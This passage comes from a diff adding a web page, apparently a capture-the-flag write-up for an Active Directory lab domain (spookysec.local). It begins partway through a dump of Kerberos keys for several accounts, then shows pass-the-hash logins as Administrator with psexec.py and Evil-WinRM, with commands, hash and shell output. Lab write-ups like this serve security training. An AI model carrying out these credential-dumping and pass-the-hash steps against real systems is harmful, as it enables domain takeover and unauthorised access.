+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\M</span>uirland:des-cbc-md5:cb8a4a3431648c86
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\h</span>orshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\h</span>orshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\h</span>orshark:des-cbc-md5:a823497a7f4c0157
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\s</span>vc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\s</span>vc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\s</span>vc-admin:des-cbc-md5:2c4543ef4646ea0d
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\b</span>ackup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\b</span>ackup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\b</span>ackup:des-cbc-md5:d601e9469b2f6d89
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\a</span>-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\a</span>-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\a</span>-spooks:des-cbc-md5:e09e4683ef4a4ce9
+</span></span><span style="display:flex;"><span>ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:bffdeb6a82c14f54f42314c25a52ab2cdee565388e75aae56142c72b998c02ae
+</span></span><span style="display:flex;"><span>ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:8ae5e67079cf0568a83755b55afa22d1
+</span></span><span style="display:flex;"><span>ATTACKTIVEDIREC$:des-cbc-md5:76ef51454394df8f
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...
+</span></span></code></pre></div><h2 id="pass-the-hash-psexecpy">Pass the Hash [psexec.py]</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; psexec.py Administrator@10.10.152.60 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20221214.172823.8799a1a - Copyright <span style="color:#ae81ff">2022</span> Fortra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on 10.10.152.60.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file DMoYDhmb.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on 10.10.152.60.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service sVHQ on 10.10.152.60.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service sVHQ.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.17763.1490<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2018</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;
+</span></span></code></pre></div><h2 id="pass-the-hash-evil-winrm">Pass the Hash [Evil-WinRM]</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; evil-winrm -i 10.10.152.60 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt;
+</span></span></code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
